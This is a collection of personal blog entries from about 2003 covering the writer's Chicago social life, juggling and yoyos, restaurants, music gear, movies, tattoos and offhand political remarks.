gulf war redeux.. everyone is going crazy cuz the U.S. was wrong about weapons of mass destruction. it seem that everyone in the whitehouse is attempting to show how <a href='http://www.boston.com/dailynews/192/world/Bush_and_Rice_say_CIA_cleared_:.shtml'>they are not to blame</a>. even the british are attempting to &#8221;<a href='http://www.thescotsman.co.uk/index.cfm?id=752202003'>right</a>&#8221; things. everyone should <a href='http://www.msnbc.com/news/937427.asp?0cv=CB10'>not like bush</a>. I find it wierd how he is taking what little power the U.S. worker has away from the individual worker and placing the decisions for overtime, healthcare and all that into the hands of the corp. to bad we are not a mild-socialistic country like some of those weirdo&#8217;s in europe.. <a href='http://news.bbc.co.uk/2/hi/europe/3056413.stm'>eh</a><br /><br /></p>

<p>the other day I read the newwest harry potter book. it was big. I was able to complete it in one sitting(granted an 11 hour sitting). I really liked it. I hate reading them so quickly and when they first come out.. cuz then you have to wait 3 more years or so for the next one. doh. alas.. I love the harry potter universe however.. I want to be a wizard. <br /><br />this weekend should be fun. a bunch of parties tonight. programming and maybe fischerspooner tomorrow. and hopefully hanging out with new people and then my old faithfuls.. heh.</p>

                <p>So on thursday I got really bored and made a false profile for a <a href='http://bigchurch.com'>christian dating service</a>. It is really lame.. however we made a funny profile. unfortunantly it deleted the best part. I was so sad. :( here is an excerpt: <blockquote><small>
When I was a younger lad, I unfortunately witnessed a crime of passion that changed my life forever. Finding my mother in bed with our gardener caused me to reject the life of sin that had been a part of my life up until that point. I read a bunch of theological texts and realized that I was not too late to change my ways. In my 15th year I started going back to church. Since then I have attempted to contribute and participate in my Christian community every chance I get.
</small></blockquote> So anyway. I haven&#8217;t been to work since thrusday.. which in turn meant that I haven&#8217;t been on the computer since then. My parents came and visited. it was a lot of fun. we ate a lot. and walked a bunch. we went to a number <a href='http://www.bin36.com/'>of</a> <a href='http://www.veggiediner.com/'>rather</a> <a href='http://www.masrestaurant.com/'>good</a> <a href='http://www.smithandwollensky.com/'>resturants</a>. I like it when they visit.. I really enjoy my family. we don&#8217;t put a lot of stock into the <a href='http://www.tastesofchicago.com/'>generic part of family vacations</a>.. the tourist part. so we just hang out and chill. <br /><br />boy oh boy.. <a href='http://www.babyink.com/'>this is crazy</a>. <br />i thought the movie <a href='http://www2.foxsearchlight.com/28dayslater/'>28 days later</a> was good. the minimalism reminded me a lot of <a href='http://www.amazon.com/exec/obidos/ASIN/6305228876/nata2productions'>funny games</a>(which you should all see), it was painful to wait for things to happen. I loved how choppy the action was. I thought it really showed the rage that the &#8221;<a href='http://la.cacophony.org/zombies-gore4.jpg'>zombies</a>&#8221; <a href='http://bushong.net/pics/photos/pets/kirby/possessed-kitty.jpg'>possessed</a>.</p>

                <p>so lasts nights performance was lame. I mean it was OK from a juggling perspective. we barely dropped and we &#8220;looked&#8221; good.. hehe. (pictures to come)- but the show was dumb. I wish we had a real band to juggle with. heh. <br /><br /> <a href='http://fantastic.library.cornell.edu'>This</a> site is really great. I really enjoyed the pictures. so I made a script that picks a random one and displays it. the script is &lt;A href=&#8221;http://penisfighter.com/fright.php&#8221;&gt;here&lt;/a&gt;. just keep reloading. The pictures rule.</p>

                <p>so for the past week or so I have been arrivign at work a lot earlier than I have in the past 2 years. I usaually arrive on time or about 15-30 minutes before 9. it is insane. cuz by 10, I am already like.. dang.. I have been here a long time. heh. whatever. .. so anyway. this morning. I arrived at work and lost my ability to use punctuation.. what the fuck. hehe. anyway. I really just arrived at work and suddenly had a really bad migraine. it sucked. I could see anything. all I could do was lie down. which isn&#8217;t necessarily kosher at work. so I sat at my cube while my head tried to unscrew itself from my shoulders.. until my boss told me to go and sit in a dark conference room. that seriously helped. I can see now.. but my head is trying to die. stupid death. <br /><br />i had a bad dream last night. I think it was a home invader dream. those are scary. <br /><br />talib kweli is good. <br /><br />i am unable to install freebsd for the life of me. wtf. label editor.. heh.. I am a lamer<br /><br />tonight matiss and I juggle at the abbey pub with the superstars of love. hopefully it will RULE.</p>

                <p>after work I went to the <a href='http://www.apple.com/retail/northmichiganavenue/gallery2.html'>apple store opening</a>. it was interesting. nothing like sitting outside in a line for 2 hours with a bunch of people who are waiting to get into a computer store. I took three rather poor pictures: <a href='http://nata2.info/pictures/misc/phone_camera/1019950211.jpg'>1</a>-<a href='http://nata2.info/pictures/misc/phone_camera/1019963523.jpg'>2</a>-<a href='http://nata2.info/pictures/misc/phone_camera/1019972611.jpg'>3</a>. stupid lack of camera. I need to remember to grab my digicam before events like this. it isn&#8217;t like it is a cumbersome thing to carry around&#8230; I was able to arrive in time to get a shirt&#8230; however it was a large t-shirt.. which I am totally not into.. also - it is a mac shirt.. which I am also not really into .. so I gave it to a much more deserving person. <br /><br />after the apple opening.. I went to another opening at the <a href='http://www.mcachicago.org/'>MCA</a>. It was for the photographer <a href='http://www.mcachicago.org/MCA/exhibit/current-txt.html#ThomasStruth'>Thomas Struth</a>. He takes <a href='http://www.mcachicago.org/MCA/images_6_23_03/Pergamonhome.jpg'>nice pictures</a> ;). It was a nice opening. after the opening we hung out and talked with some interesting people.. who were all very surprised that I was corporate and not an artist. hehe. showed them a lesson. silly lessons.. one of the more intersting things that happened last night was this dance party that the MCA had in the back. It was some performance installation or whatever.. but it composed of two DJs in either corner of this largeish dancefloor area - people then check out these headsets and could listen to either DJ and dance and such. however.. the other patrons couldn&#8217;t hear the music. so it was insane. like a HUGE party where everyone is listening to music&#8230; and reacting ot it.. but you can&#8217;t hear it. It was quite something. <a href='http://nata2.info/pictures/misc/phone_camera/1021192195.jpg'>i loved it</a>. ;)<br /> after that we then headed off to <a href='http://www.sushiwabi.com/'>sushi</a>. Which was a lot cheaper thatn I imagined it to be. and it was very very good. I had some really nice rolls and a couple of rather dope red snapper nigiri. w00t. haha. umm.. yea..<br /><br />then we made it to <a href='http://www.visionnightclub.com/'>vision</a>(eek) for pier&#8217;s <a href='http://www.retroelectrochicago.com/'>party</a>. I don&#8217;t like vision much. heh. but it was a good party. and it was nice to see everyone.. even if I did suddenly disappear. <br /><br />tonight I am going to a play. it should be nice. we shall see.. things are of course still like a weird dream in my life. I have a lot of work todo. and am doing it.. which is seriously cutting back from my fashion lifestyle which I love so much. but yea whatever. I need to do more work..haha.. and meet more girls.. wait.. I mean.. <br /><br />yea</p>

                <p>Last night I came home early and worked a bit. I was so tired though. I didn&#8217;t get much done. today however is a different story.. after getting off rather slowly I finally got on track and worked a bunch. I got a lot of the first part of my project done. it is still far from being completed - but.. it is right on track.. eek.. still it is a big project. <br /><br />my headphones have been a total lifesaver. I was able to work outside without being as distracted. it is really fun. I can&#8217;t even hear my phone ring. or the firetrucks that go by. nothing.. but music. so nice. the best part is that you don&#8217;t have to crank the volume to have a good experience. I can have it softer and still feel like I am able to really hear the music. it is quite nice. I always used to laugh at the reviews where people claimed to hear more from recordings.. like &#8220;once I tried the shure e2c headphones I was able to hear parts of the recordings I hadn&#8217;t noticed before.&#8221; heh. but it is true. I noticed a lot of new stuff in cds I have had for years and almost worn out. I mean.. the quite things.. like the studio artifacts and little drum taps.. and all sorts of good stuff.. skinny puppy rules. but yea. I would say that the shur e2c headphones are my new favorite toy. my ipod is happy too. it gets used so much more. it will be interesting to see how the commute goes tomorrow. <br /><br />i think I am gunna start smoking.. hahah.. just kidding. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;i need to go make some food. and then finish this shit.. ahaha. maybe I will get it all done. that would be amazing. I doubt it will happen though. but yea never know. I am thinking of making spaghetti. my laptop battery is low. I will have to stop working. woe is me. I guess I coudl go into my hot/stuffy room. &lt;br /&gt;&lt;br /&gt;stupid girls. why dont they come and find me.. they always leave me alone.. I guess maybe the &quot;i will wait for the girls to come to me&quot; philosophy of matiss&apos; may not be good for me. it seems so nice though. no maintenence. someday.. SOME DAY.....  aahhhhhhhhhhhhhhh</pre></p>

                <p>Last night I went to this electro party. it was OK. it was a HUGE space and their was not enough people to fill it up. However - it was rather well executed and overall it did a good job as a party. my friend <a href='http://www.chris.fm'>Chris</a> DJ&#8217;d and that ruled.. but some cats were pissed.. cuz his headphones were similiar to their previously stolen ones. wtf. <br /><br />speaking of headphones. - I got my new ones. seriously dope. I am sitting here in a coffee shop.. listening to my IPOD and there is a LOT of noise. I see everyone look up and stare at a car. hiromi looks at me and starts talking.. so I disengage my eargoggles and ask her what happened.. apparently a car drove by and made quite a ruckus.. I didn&#8217;t even hear. it ruled. so so much. well.. my food is here.</p>

                <p>I have been waking up earlier lately. it is rather strange. I am still a bit late to work(9:10/15), but I am up longer and feel better. weird. maybe it is cuz I don&#8217;t go out EVERY NIGHT. heh. umm.. yea.. well I have been workign a lot on this ringtone stuff.. it is fun. but I have to plan a lot to make sure it is robust. stupid robustness. I hate you so much ;). Today I ordered a <a href='http://shure.com/earphones/eseries_e2c.asp'>pair of new headphones</a>. I don&#8217;t know why. I don&#8217;t really need them. maybe cuz I am a gadget guy. they are getting great reviews.. I really wanted the <a href='http://shure.com/earphones/eseries_e5c.asp'>better ones</a>. but I figured I should probably buy headphones that are cheaper then the ipod. heh. a good rule of <a href='http://www.preschoolprintables.com/small%20girl%20&%20thumb.gif'>thumb</a>. <br /><br />speaking of music. I am going to make a metal mix cd for some friends. if you want one email me your address and I will send one your way. I hope it is good. but yea. it will be sludgy newish stuff.. like isis, pelican, fudge tunnel and the like. apparently I need to check out earth. but yea. it will be a dark and very heavy mix. <br /><br />i love finding stuff.. and I really love found <a href='http://www.foundmagazine.com/'>picture web sites</a>. it is so interesting to see what people lose. <br /><br />it is important to be aware of what is happening around you. especially when bush is our leader. check <a href='http://www.democrats.org/scotus/bushenstein.html'>this out</a>&lt;/a&gt; - so scary.. yet so true. I love our president. <br /><br />When I was little and I thought of growing up.. I dreamt of being like <a href='http://joi.ito.com'>this guy</a>. he wrote for <a href='http://www.techtv.com/screensavers/supergeek/story/0,24330,1856,00.html'>mondo 2000</a>(<a href='http://www.deoxy.org/t_mondo2.htm'>this interview</a> changed my worldview).. is international.. is really smart.. and is in the right place at the right time. he is a dj.. so he knows music.. and I am stalking him.. wait no.. I mean.. I just read his <a href='http://joi.ito.com/static/aboutjoi.html'>about page</a>.<br /><br />anyway.. my life is confusing. I am thinking about attempting to leave the country within the next 5 years.. just for the experience of living somewhere else. I think it would be a good step. I don&#8217;t want to be a cubicle monkey for the rest of my life. <br /><br />everything looks spelled wrong.</p>

                <p>So this weekend was erally great. So much nice stuff happened and went down.. but all because of a very sad reason.. Yesterday <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fbecs%20last%20supper&img=becs%20last%20supper%20025.jpg'>bec</a> left for <a href='http://formen.ign.com/news/35755.html'>miami</a>.. :( - hopefully we will see her again. I really enjoyed hanging out and getting to know her. I wish her the best of luck and hope to her from her soon.. however the saying goodbye part was soo sad. I hate being sad and goodbyes are the hardest part. especially when the person is nice and ultra cool. doh times 10. <br /><br />so on friday - I got home from doing a BUNCH of work and helped Hiromi make <a href='http://www.pbs.org/wgbh/victorygarden/recipes/gyoza.html'>pot stickers(gyoza)</a> and helped serve the really great meal she <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fbecs%20last%20supper&img=becs%20last%20supper%20001.jpg'>prepared for us all</a>. It was quite nice. all of my roomates were there and we all <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fbecs%20last%20supper&img=becs%20last%20supper%20003.jpg'>tried crazy vegemite</a>. it is gross - although the vegans all thought it ruled. stupid vegans. after the dinner.. we went to marcia&#8217;s house for her party. it was fun. a bunch of photo people. I didn&#8217;t blend in well. I don&#8217;t know a thing about photo.. hehe. however, once we broke out the <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fbecs%20last%20supper&img=becs%20last%20supper%20020.jpg'>hula hoop</a> - it was all good. matiss and I had to demonstrate our skill at <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fbecs%20last%20supper&img=becs%20last%20supper%20019.jpg'>two person hula hoop</a>. then we went to sleep..<br /><br />on saturday we went to <a href='http://entertainment.metromix.chicagotribune.com/top/1,1419,M-Metromix-Dining-X!PlaceDetail-10538,00.html'>Mas</a>. it was a very <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fmas%20dinner&img=mas%20dinner%20003.jpg'>very</a> <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fmas%20dinner&img=mas%20dinner%20005.jpg'>nice</a> <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fmas%20dinner&img=mas%20dinner%20004.jpg'>meal</a>. we all had seafood. it was great. such good food. After Mas we went to a party - which sucked.. but was funny. <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fmas%20dinner&img=mas%20dinner%20013.jpg'>nic was there</a>. he looked good. ;). we then went to the empty bottle for modfest or whatever and then went to exit. at some time bec <a href='http://nata2.info/pictures/misc/becs_going_away_weekend/mas%20dinner/mas%20dinner%20017.avi'>did a little dance for us</a><br /><br />sunday we all went to lula for a little breakfast. it was once again a really nice time. afterwards we went to my house and <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fbecs%20breakfast&img=becs%20breakfast%20017.jpg'>juggled a bunch</a>. matiss and bec worked on <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fbecs%20breakfast&img=becs%20breakfast%20026.jpg'>standing on one another</a>. it actually <a href='http://nata2.info/pictures/misc/becs_going_away_weekend/becs%20breakfast/becs%20breakfast%20030.avi'>worked</a> - weird.. well it <a href='http://nata2.info/pictures/misc/becs_going_away_weekend/becs%20breakfast/becs%20breakfast%20029.avi'>didn't always</a> <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fbecs%20breakfast&img=becs%20breakfast%20023.jpg'>work</a>. but for ther most part they got it. <br /><br />it was really sad to see her go. but it was very nice having her here.. and I felt she left at the <a href='http://nata2.info/?path=pictures%2Fmisc%2Fbecs_going_away_weekend%2Fbec%20and%20matiss%20insanity'>peak of things</a>..<br /><br />this weekend was very strange.. over all. it was full of such decadence. I really enjoyed it. my favorite thing in the world is to hang out with a select few people and have a really gerat dinner. that is pretty much all that went down this weekend.. it was also strange to say goodbye.. and also <a href='http://www.saracen.org/'>weird</a> cuz of stuff between marcia and myself.. well not weird but sadly expected.. overall the weekend was so up and down. the lows were really low.. but the highs were so high it was out of control. the dinner at mas was one of the best I have had.. here in chicago. <br /><br /><a href='http://www.pleasuresean.com/BurningmanMainPage/Burningman2002MainPage/Page3/images/Tighty%20Whitey%20Liberation%20front%20preparing%20to%20cut.jpg'>out of hand</a></p>

                <p>but I called the <a href='http://www.yoyoguy.com'>yoyo guys</a>, and they have found my package. it was returned. whew. my yoyos will live&#8230; again.. <br /><br />Yesterday was nice. I went after work to visit marcia at the art institute, we then went to <a href='http://entertainment.metromix.chicagotribune.com/top/1,1419,M-Metromix-Dining-bubbletea!PlaceDetail-20521,00.html'>Joy Yee</a> on a whim and had food and great fruit shakes. I love when hanging out is good. like.. not silly or pretentious.. just chill.. <br /><br />after that I went to busy beaver and got the virgin tears and unemployable buttons and then went and to the pelican/melt banana show. it was great. I really enjoyed pelican. they were so tight. it is enjoyable. <br /><br />today, I have been playing this fun flash game called <a href='http://www.xgenstudios.com/castle/index.htm'>castle</a>. check it out. it isn&#8217;t really hard until you get past the 8th or 9th level.. then it gets hard ;)</p>

                <p>so .. the last 2 weeks I haven&#8217;t really hung out or gone out as much as I had before. it is weird when you go out an insane amount and then suddenly stop. I like it.. the stopping.. it was so relaxing and so nice. I hung out with my mom and aunt/cousin.. and hung out with marcia a bunch.. and now I am needing to re-introduce myself into the &#8220;real&#8221; world. I really love going out.. but it requires so much maintenence. you have to keep up with so much. I think I am going to edit what I do. because I need to balance my worlds a bit more. now that I have three worlds.. I have my going out world&#8230; my work world.. my good friend world.. and my ner world&#8230; wait that is four worlds.. I was doing well with two or three.. but four.. wow.. too much.. heh. I imagine I will work it out. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;bR&gt;hanging out with marcia rules. hehe. totally. I am smitten. hopefully things work out reasonably well in that situation. it is always tough hanging out with new people.. you can&apos;t always predict how things will work or what the dynamics are in certain situations. I will probably soon know. girls with short short hair are cute. &lt;br /&gt;&lt;br /&gt;Bec is leaving on monday. it is a real bummer. I am sure matiss is bummed. it sucks when people leave.. stupid people. hopefully we will hang out this weekend and have a really good time. &lt;br /&gt;&lt;br /&gt;in other news.. my stress has led me to make drastic decisions in regards to my appearance. I now look like a frog. no really. I set up an appointment to finish up &lt;a href=&quot;http://nata2.info/?path=pictures/harper/tattoo&quot;&gt;my tattoo&lt;/a&gt;.. which is super exciting. I am going to &lt;a href=&quot;http://tomatotattoo.com&quot;&gt;tomato tattoo&lt;/a&gt; on thrusday. hopefully it rules. I am ALWAYS scared of tattoos.. cuz they really hurt. I will bring a camera. I want to get good pictures. I love pictures. then.. a week from thursday - I am going to the hair place to dye my hair again. this time a bit more drastic. I love it. I have had a &lt;a href=&quot;http://nata2.info/?path=pictures%2Fharper%2Fme&amp;amp;img=haircut%20023.jpg&quot;&gt;mohawk for so long now&lt;/a&gt;. &lt;br /&gt;&lt;br /&gt;soon I will be a real boy. with a little hope and a lot of love.. I will get my yoyo&apos;s today. &lt;a href=&quot;http://nata2.info/?path=pictures%2Fharper%2Fme&amp;amp;img=Chicago%20016.jpg&quot;&gt;i NEED them&lt;/a&gt;. NEEEEED!</pre></p>

                <p>so often on the internet you can suddenly run across some picture or whatever that is very nasty. so sometimes geeks obsess with these pictures.. heh. so I sent a link to a picture of this sort to a friend and he responded:<blockquote><b>ashtar1999 (<i>2:42:37 PM</i>)</b>: that was the nastiest thing I have ever seen.  Please don't send me links like that, those kind of images flash through my head when I fucking people and it makes me want to die.  It's way too clockwork orange for me.  I like my sexy to be you know sexy
</blockquote> hehe. rule. I am laughing so hard right now. the war is on. In other news. I got 10 new hardcore/metal cds. so fun. they packed the box with some &#8220;positive-youth-ish&#8221; t-shirt. heh. rule. now I can ex it up. <br />i also got my new ipod today. they are so dope. it is out of control. I really like it. 30g is soo much. ;) <br /><br />hopefully all will work out today.. whilst I listen to my slayer cover album.</p>

<p>Last night was really fun. I hung out with marcia again.. we just chilled. I forget how nice it is to chill out and not go out. I have gone out almost 20 nights/month for the past year. that is roughly 240 nights/year. heh. I think it might be about 65% of the nights.. whoa. I am a club kid. (this is where I would make the house/techno music noise.. um-tis um-tis um-tis.. and dance). anyhow.. <br /><br /></p>

                <p>so this weekend ruled. my friend marica took me to <a href='http://www.tangoparatodos.com/'>tango</a> heh. yep. that is correct. I had forgotten how much I enjoy to dance ballroom style. it is a lot of fun. so on saturday I slept a bit, did laundry and watched a movie called <a href='http://us.imdb.com/Title?0123865'>gia</a>. It was <a href='http://www.giamariecarangi.hpg.ig.com.br'>quite sad</a>. We watched it mid day.. so then going out and hanging with a bunch of rocker kids was quite weird - it seems that often their goal is to have the life that gia led.. which inevitably leads to something fucked up.. stupid drugs.. but anyway.. after the movie hiromi, dave and myself went to get ethopian food with some friends of daves. I love ethopian food. the bread is so nice. I had chicken. heh. I love eating. after the food time - I went to a <a href='http://www.lumpen.com/buddy/'>circus themed fashion show</a>. matiss and I were supposed to juggle for it.. but we screwed that up. silly us. anyway.. I hung out with marcia and some of her friends and we ended up going to <a href='http://www.exitchicago.com/'>exit</a>. Exit is such a strange club. I then went home and crashed on my couch.. since I had friends who were sleeping in my bed. doh. heh. <br />on sunday I hung out with my roomies a bit and then went to another bbq. bbqs are so much fun. this one was outside and it was finally warm (wtf - seriously it is june) so I was abel to really get some good yoyo tricks down.. heh. I love to yoyo. so much fun. after the bbq I went with marcia and some friends to go tango.. which I mentioned above ;)<br /><br />one of the weirdest thing about yoyoing is that the accolades you get are so varied. for instance - I have very rarely found that women react positively to the yoyo - I mean they don&#8217;t hate it.. and often they like to watch, but compared to the reaction I get from men, women have a generally mild reaction. for instance, at the party I went to on friday their was a small talent show.. so I yoyoed and afterwards - I was offered drugs, drinks and generally found to be a good person by many men at the party.. all because of my yoyo skillz. it is so weird. not very many women actually made a big deal about it.. I mean everyone said good job and all that - but the men seemed to feel the need to identify and relate to me and my yoyo.. <br />which brings me to anotehr question: why don&#8217;t they offer me money when they are attempting to relate. drugs and drinks are a nice gesture.. but I don&#8217;t use drugs and I can only drink so much.. ;) but anyway.. <br />so in all it is interesting to see the dynamics of the yoyo reaction. I wonder if it is purely based on the socialization of the yoyo scene.. how when boys are little they may have more of a chance to get a yoyo than a girl.. whatever.. it is strange.. <br /><br />i have soo much work to do today, tomarrow and the next. that is a wash, rinse, repeat type of phrase. <br /><br />btw, I am not a playa I just crush a lot.</p>

                <p>First off.. they wrote a <a href='http://classic.winamp.com/'>good piece of software</a>. They wrote the original gnutella client and leaked enough info out for it to be easily reverse engineered and propagated. but AOL pulled it. they recently <a href='http://www.nullsoft.com/free/waste/'>released a program called waste</a> that was <a href='http://slashdot.org/article.pl?sid=03/05/31/1259206&amp;mode=thread&amp;tid=120&amp;tid=126&amp;tid=187&amp;tid=95'>removed</a> from <a href='http://www.theinquirer.net/?article=9787'>the website by AOL</a>. Since it was removed, nobody is <a href='http://nata2.info/?path=misc/waste'>able to download it</a>. I really enjoy watching justin frankel totally fuck with AOL. What really gets me is this rather humorous post on <a href='http://winamp.com/news.jhtml?articleid=9961'>DADD</a> (Dating Attention Deficit Disorder). I have no idea what that article is talkign about&#8230; ;)<br /><br />i haven&#8217;t really been coehsive in my posts recently. I don&#8217;t know why. I just haven&#8217;t felt that they have really gelled. I don&#8217;t know why. I also started swearing within them - which I haven&#8217;t done in a long time(sorry mom <b>;)</b>). but whatever. I am tired today.</p>

                <p>Last night I was possibly supposed to hang out with this friend/aquaintence. it didn&#8217;t happen so I went to lula and ate dinner with my laptop. I was able to get a bunch of work done, eat a really incredible meal(salmon with rubarb and parschnips.. heh.) and get desert and all that. Since I was all by myself at the resturant I was sitting up at the front bar area, so when another person came by themselves they sat with me. it was fun. I met a nice young women. we hung out and talked and discussed how the US is insane.. and how buch is a monster. It was nice. I then went home and got ready to go ut.. and then didn&#8217;t. I instead watched the movie 25th hour. It is a bit sad and depressing but, good. I enjoyed it. I really like edward norton. he seems to be a good actor. it was a weird movie to see him in but yea. <br /><br />the other day I spelled grind like dring.</p>

                <p>The indy 500 rules. it is so totally insane. Last night we rolled in about 10 oclock and arrived amidst a bout of drunken insanity. This man called lurch was doing insane things. not normal things. it was crazy. so we drank a bunch and eventually made it to bed. My brother has a dv cam so we just filled a bunch of crazy stuff. They brought two scooters, and a golf cart. It is very fun. So today I woke up and started playing this crazy game on the golf cart.. I was wearing a leather coat and a helmet and we would go as fast as we could and attack our other campers while they threw anything they could find at us. then I would jump off and let the momentum carry me to attack. it ruled. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;then we went and drove around the scooters. heh. It was all fun and games until I fell over and hit my face on the ground. heh. I now have a cut up lip, a black eye and a bruised nose. I look like I got in a bad ass fight. check out the &lt;a href=&quot;http://nata2.info/?path=pictures%2Fmisc%2Findy_500_03&quot;&gt;pictures&lt;/a&gt;. manny more to come. ;)</pre></p>

                <p>Today I had another battle: me vs. pseudo-ephedrine and caffiene. I lost the battle, however I won the war. I finally got some nyquil so maybe I will actually sleep. I keep having waves of absolute exhaustion wash over me. woah. it is insane. But I am propping myself up against my cube with the sticks I collected at lunch and attempting to seem busy.<br /><br />speaking of busy - I seriously rocked a meeting this morning/early afternoon. I think it was the combination of cold medicine/soda/insanity that made me so hott.. but whatever it was I was like a modded cyborg ready to strike. I jumped and swirved with the greatest of precision. I was like a hot blade in cold flesh. <br />umm.. <br /><br />i just got back from virgin with a bundle of dancehall cds. so good. I love it. more more more</p>

                <p>So I was rather sick yesterday.. I felt like hell. so I slept from 6-10 and then hung out from 10-11 and then went back to bed. but I couldn&#8217;t sleep. all I could do was become delerious. so after imagining ghosts and thinking of horror movie plots I finally managed to goto bed around 2am. suxor. I had crazy dreams. sometimes being sick is fun. I lov ethe side effects. the crazy dreams, the irrationality.. all the nonesense.. etc.. so I woke up this morning for an early meeting and was totally insane. I had to put on music and I took a long shower and got dressed.. all while thinking of crazy things.. and still dreaming about horror movie plots&#8230; so I finally made it to work at 8:30 and I felt better.. but I decided to take soem sudafed. but I think I took too much. maybe you can tell from this post.. I am a little bit on the rambling/ranting side of things today&#8230; anyway.. <br /><br />i go to the indy 500 on friday. I am excited. but I am also bummed cuz I lost my phone and I needed it to gain internet access from the indy. doh. sad. <br />I am giving a shout out to my friend ella in taiwan. She is gunna be graduating soon. Congratulations..</p>

                <p>after my brief bout with insanity due to over the counter drug use.. I decided to grow up. I know have a lawyer and I am reading information about purchasing a place to live. woah. that is insane. all of my coworkers are doing this too. I think it is madness. I mean. I recently bulked at the paltry sum of $4500 for some servers.. let alone $200K for a condo in chitown. wtf. who invented this crazy game.<br /><br />well maybe the drugs didn&#8217;t wear off.. stupid drugs.. stupid colds which lead to drugs. did anyone see that scary antidrug commercial about changing legislation to allow more drugs.. it was insane.. so scare tactic. dumb dumb conservatives. heh. umm yea. <br /><br />so the ipod is causing quite the stir.. I think I will be selling it for like $250-275 I have a couple who are interested. if you are interested let me know. I will be selling it in the beginning of june. <br /><br />i think I need to make an automatic link system that seeds links in my entries automagically. whatever. <br /><br />money is stupid. give me some.</p>

I have decided that I will probably finsih my tattoos soon. I am scared though. cuz I know they will hurt and I hate that part about that. but I hate the fact that they are not quite perfect yet. I feel as though I am about to get sick. I hope it isn&#8217;t the case. I hope the case is a case full of strawberries and magic. that is what I woudl like right now.. and a bunch of sleep. ahhh&#8230; sleeep..</p>

                <p>So the weekend is over.. well almost. tonight I think we are going to see the matrix. I am rather excited. whee. matrix. On friday I went out with my friend katie to see the faint. We left rather quickly.. the faint sucked it up.. haha. not really.. but I didn&#8217;t really enjoy them as much as I had in the past.. so I was done with it rather quickly.. heh. Then last night we went to an underwear party. It was so funny. We arriveed with a couple bottles of <a href='http://www.clicquot.com/wineries/wine.asp?winery=clicquot&amp;key=47'>Veuve</a>.. heh. It is fun to roll hard.. haha. so ridiculous. anyway. the underwear party was a success - it seemed that maybe 100 people were in their underwear hanging out and what not. It was so funny. I have never really hun out in my underwear with more than 1 person.. let alone 100. ;) however.. my phone got stolen.. which totally put a bummer on the weekend. But I was able to hook up my old ghetto phone.. and I ordered a new phone.. however.. it was not insured. stupid loosing. <br /><br />anyway.. now I am trying to decide whether I should get the picture phone ;) hehe. <br /><br />If anyone wants to buy a new but slightly used 20g Ipod.. let me know</p>

It is an automagic .Klip file maker for use with the <a href='http://www.serence.com/provider.php?page=started_home'>serence KlipFolio</a> product. It allows any blog owner to make a .klip file for someone to download, so that they can syndicate their content easy and whatnot. I was tired of only having the canned content that serence provides. now I can use whatever I want.. hehe. I rule.

                <p>hehe. Yesterday ruled. I got up at around 1:30 or so and called my mom. w00t. then I went to lula with matiss, beck, eleni and silvia. We hung out until around 3:30 and had an incredible meal. I think I had catfish and eggs and then shared a bunch of desert with my friends. so so good. we then went back to my apartment and watched a <a href='http://www.ntv.co.jp/ghibli/'>studio ghibli</a> movie called Nausica? of the Valley of Wind. I think it is the first movie from <a href='http://www.nausicaa.net/miyazaki/'>Hayao Miyazaki</a>(who is by far my favorite animator). It was so so good. I really like his story lines and such. I actually got spirited away for my mom for mothers day. I hope she likes it. Then after the movie. we laid around for awhile and evetually made it to pacific cafe. where we had another really great meal. I had spicy tuna maki, a tom kha kai soup and a super spicy lemongrass mix. So nice. at the end of the meal we decided to goto the new Xmen movie. it was quite fun. I really enjoyed it. I want to be an xman. I would totally be night crawler if you would let me. ??! <br />anyway.. I am excited for this week. we shall see what comes of everything..</p>

                <p>so it rained really hard for a long tie tonight. well not too long but like 30 minutes. the hippie guy that lives next door told me that a tornado was spotted 30 miles away. whoa. that would be crazy. in the country tornados touch down and nothing happens. but here havoc wuold insue. whoa. so after he said this - I immediately took off all my clothes and put on my nike basketball shorts and went outside and laid on my lawn chair. I had my ipod and cell phone in plastic bags. I listened to classic rock. it was great. then the wind shifted and it got really cold. so I came in. <br /><br />Today hiromi, matiss and myself all went to meet our friend mark, lenore and some friends of theirs at art chicago. We then traveled to get some indian food, and then went to the prodigal son bar and played darts. Mark taught me some really kick ass yoyo tricks. It was nice. Right now I am not sure I am going to go back out. even though the night is still young. hmm..</p>

                <p>saturday night we went to this resturant called <a href='http://www.masrestaurant.com/masrestaurant/'>mas</a> where we were meeting some friends. As soon as we arrived this guy started talkign to us and eventually purchased each of us (<a href='http://thom.watership.org'>Thom</a>, <a href='http://chris.fm/'>Chris</a> and <a href='http://www.harperreed.org'>myself</a>) many MAS MARGARITA then some MOJITO and finally some CAIPIRINHA this was also accompanied by a shot of tequila and sprite. It was great. He was a really nice guy. so so funny. The rest of our guests arrived so we got a table and sat down. We had appetizers and entrees and some drinks.. THen when we were done the waitress brought our check and let us know that our previous benefactor had purchased our meals and our appetizers. so our check for this $200 dinner was $22. It ruled.</p>

